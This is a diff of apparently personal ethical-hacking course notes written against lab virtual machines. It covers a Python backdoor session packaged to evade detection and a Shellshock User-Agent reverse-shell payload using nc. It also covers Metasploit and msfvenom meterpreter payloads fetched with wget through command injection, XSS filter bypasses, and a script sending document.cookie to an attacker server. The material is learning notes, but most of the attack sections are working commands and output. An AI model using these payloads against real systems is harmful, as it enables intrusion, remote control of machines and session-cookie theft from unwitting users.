@@ -123,27 +123,6 @@ TCP garantee packet are received and received in order + resend if fail/corrupti
 no reception garanty, tradeof = much faster than TCP
 use for broadcast/live/etc.
 
-## setup vulnerable machines and kali
-- https://www.rapid7.com/blog/post/2011/12/23/where-can-i-find-vulnerable-machines-for-my-penetration-testing-lab/
-
-install ssh on kali
-```
-sudo apt-get install openssh-server
-sudo systemctl enable ssh
-sudo systemctl start ssh
-```
-kali vm, allow only one host for ssh (host machine)
-```
-sudo vim /etc/hosts.deny
-    sshd: ALL
-sudo vim /etc/hosts.allow
-    sshd: <host machine ip>
-```
-
-change keyboard layout on metasploitabe : [not required](https://zsecurity.org/forums/topic/how-to-change-the-keyboard-layout-on-the-metaspoitable-vm/)
-
-setup network adapter on bridged network to be accessible from hyper-V kali VM [source : Virtual Box Switch Types](https://www.philipdaniels.com/blog/2016/vm-networking-overview/)
-
 ## Scans - nmap
 cmd : `sudo arp -a` 
 arp : access machine arp cache
@@ -421,7 +400,7 @@ payload => cmd/unix/reverse
 └─$ searchsploit apache 2.2.8
 
 # scan all port
-sudo nmap -sV 192.168.1.7 -p-
+sudo nmap -sV <vm ip> -p-
 
 vncviewer <metasploitable ip>
 ```
@@ -588,7 +567,7 @@ Veil>: list
 ...
 Veil/Evasion>: use 22
 [powershell/meterpreter/rev_tcp>>]: set SLEEP 42
-[powershell/meterpreter/rev_tcp>>]: set LHOST 192.168.1.23
+[powershell/meterpreter/rev_tcp>>]: set LHOST <kali ip>
 [powershell/meterpreter/rev_tcp>>]: generate
  [>] Please enter the base name for output files (default is payload): powerpayload
 
@@ -716,7 +695,7 @@ msf6 > use exploit/windows/local/persistence_service
 msf6 > set SESSION X
 set RETRY_TIME 17
 set RETRY_TIME 17
-set LHOST 192.168.1.23
+set LHOST <kali ip>
 ...
 ```
 - search all post exploitation modules
@@ -728,6 +707,9 @@ msf6 > search post
 # Section 12 backdoor pydev
 - kali : run server instance (send cmd)
 - victim : run client instance (send cmd output)
+## code
+available in udemy/Ethical_Hacking_learning/python_projects/backdoor
+
 ## setup python on win10 test vm
 - install python3
 pip install -U pyinstaller
@@ -735,12 +717,169 @@ pip install -U pyinstaller
 pyinstall client.py --noconsole --onefile
 - executable in dist folder, contains exec file, not detected as threat by IDS
 
-test backdoor
+## test backdoor
 ```
 download C:\Users\IEUser\Documents\module12\test_doc.txt #OK
 upload /home/kali/dev/formation/udemy/Ethical_Hacking_learning/python_projects/backdoor/moustache.txt #KO
-upload moustache.txt #OK
-dir
-cd ..
-dir #OK
+[+] Listening for incomming connections...
+[+] Target connected from : ('<win10 vm ip>', 50120)
+* Shell~('<win10 vm ip>', 50120): dir
+ Volume in drive C is Windows 10
+ Volume Serial Number is E88E-9782
+
+ Directory of C:\Users\IEUser\Documents\module12\dist
+
+09/15/2022  07:39 AM    <DIR>          .
+09/15/2022  07:39 AM    <DIR>          ..
+09/15/2022  07:39 AM         6,347,195 client.exe
+               1 File(s)      6,347,195 bytes
+               2 Dir(s)  25,498,275,840 bytes free
+
+* Shell~('<win10 vm ip>', 50120): cd ..
+* Shell~('<win10 vm ip>', 50120): dir
+ Volume in drive C is Windows 10
+ Volume Serial Number is E88E-9782
+
+ Directory of C:\Users\IEUser\Documents\module12
+
+09/15/2022  07:39 AM    <DIR>          .
+09/15/2022  07:39 AM    <DIR>          ..
+09/15/2022  07:39 AM    <DIR>          backdoor
+09/15/2022  07:39 AM    <DIR>          build
+09/15/2022  07:39 AM               866 client.spec
+09/15/2022  07:39 AM    <DIR>          dist
+09/15/2022  07:34 AM                18 test_doc.txt
+               2 File(s)            884 bytes
+               5 Dir(s)  25,498,275,840 bytes free
+
+* Shell~('<win10 vm ip>', 50120): upload moustache.txt #OK
+```
+
+# Section 13 : Webapp pentest
+## Intro
+## Info gathering, Dirb tool
+- use scanning tools : dirb tool, harvester, nmap, etc.
+- dirb : scann website, like owasp tool
+```
+┌──(kali㉿kali)-[~]
+└─$ dirb http://<metasploitable ip>
+```
+
+## ShellShock exploit
+- get and create vulnerable vm : https://pentesterlab.com/exercises/cve-2014-6271/attachments
+- access it's web homepage and look at web response with burp
+- bash empty fct : `() { :;};`
+- shellshock vuln = write any cmd after empty function
+
+### manual exploit
+- use burb repeater to reapat a request : add `() { :;}; /bin/bash -c 'nc <kali ip>'` in Use-Agent :
+`User-Agent: () { :;}; /bin/bash -c 'nc <kali ip> 12345 -e /bin/bash'`
+- setup listerner on kali + exec cmd
+```
+┌──(kali㉿kali)-[~]
+└─$ nc -lvp 12345
+listening on [any] 12345 ...
+connect to [<kali ip>] from vulnerable.home [<shellshock ip>] 37813
+hostname
+vulnerable
+whoami
+pentesterlab
+```
+
+### exploit with msfconsole
+```
+msf6 > search shellshock
+...
+   1   exploit/multi/http/apache_mod_cgi_bash_env_exec
+...
+msf6 > use exploit/multi/http/apache_mod_cgi_bash_env_exec
+msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set RPATH /cgi/bin/status
+msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set RHOSTS <shellshock vm ip>
+msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set TARGETURI /cgi-bin/status #web path after ip
+msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set RPATH /bin 
+msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > run
+[*] Started reverse TCP handler on <kali ip>:4444 
+[*] Command Stager progress - 100.46% done (1097/1092 bytes)
+[*] Sending stage (989032 bytes) to <shellshock vm ip>
+[*] Meterpreter session 1 opened (<kali ip>:4444 -> <shellshock vm ip>:52124) at 2022-09-16 14:53:32 +0200
+
+meterpreter > getuid
+Server username: pentesterlab
+```
+
+## cmd inject vuln
+- set metasploitable webapp security to low : http://<metasploitable ip>/dvwa/security.php
+- inject cmd to http://<metasploitable ip>/dvwa/vulnerabilities/exec/# : ` ; <cmd>`
+- click view source : no input validation
+- use nc to get access : same as shellshock manual exploit
+- set metasploitable webapp security to medium : http://<metasploitable ip>/dvwa/security.php
+  - poor input valid (exclude some chars)
+- set metasploitable webapp security to high
+  - strong input validation
+
+## get meterpreter with cmd exec
+- create py meterpreter payload 
+```
+┌──(kali㉿kali)-[~/dev/exploits_files]
+└─$ msfvenom -p python/meterpreter/reverse_tcp LHOST=<kali ip> LPORT=4446 >> meterpreter_payload.py
+┌──(kali㉿kali)-[~/dev/exploits_files]
+└─$ sudo cp meterpreter_payload.py /var/www/html
+┌──(kali㉿kali)-[~/dev/exploits_files]
+└─$ sudo service apache2 start      
+```
+- from web cmd inject
+```
+| wget http://<kali ip>/meterpreter_payload.py
+ls
+```
+- from msf
+```
+use exploit/multi/handler 
+set payload python/meterpreter/reverse_tcp
+set LHOST <kali ip>
+set LPORT 4446
+run
+```
+- from web cmd inject
+```
+| python meterpreter_payload.py
+```
+- got meterpreter session :
+```
+meterpreter > getuid
+Server username: www-data
+```
+
+## Reflected XSS + cookie stealing
+### stored XSS on victim server
+- find xss vuln website
+- exec .js in victim website
+- anyone who visit website will exec .js
+
+### reflected xss
+- victim server does'nt store .js
+- send link with js code
+- set security=low
+- http://<metasploitable ip>/dvwa/vulnerabilities/xss_r/
+```
+<script>alert('Waf')</script>
+```
+- security=medium
+KO :
+```
+<script>alert('Waf')</script>
+```
+OK :
+```
+<Script>alert('Waf')</Script>
+```
+```
+<scr<script>ipt>alert('Waf')</Script>
+```
+
+- server simple http server
+python -m http.server 8001 
+- js script to get cookie (document.cookie=cookie session of user visiting page)
+```
+<Script>document.write('<img src="http://<kali ip>:8001/' + document.cookie + ' ">');</Script>
 ```
